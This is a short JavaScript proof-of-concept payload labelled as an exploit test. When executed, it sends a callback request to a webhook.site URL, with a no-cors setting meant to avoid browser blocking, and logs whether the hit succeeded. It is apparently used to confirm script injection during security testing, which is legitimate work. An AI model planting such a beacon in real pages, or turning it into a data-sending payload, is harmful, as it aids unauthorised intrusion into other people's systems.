(() => {
  const url = "https://webhook.site/c3444402-12db-4d8a-a694-0bc71f2c1521";

  console.log("[POC] Starting exploit test…");

  fetch(url, {
    method: "GET",
    mode: "no-cors", // evita bloqueos en navegadores
    cache: "no-store"
  })
    .then(() => console.log("[POC] HIT sent successfully ✅"))
    .catch(err => console.error("[POC] Fetch failed ❌", err));
})();
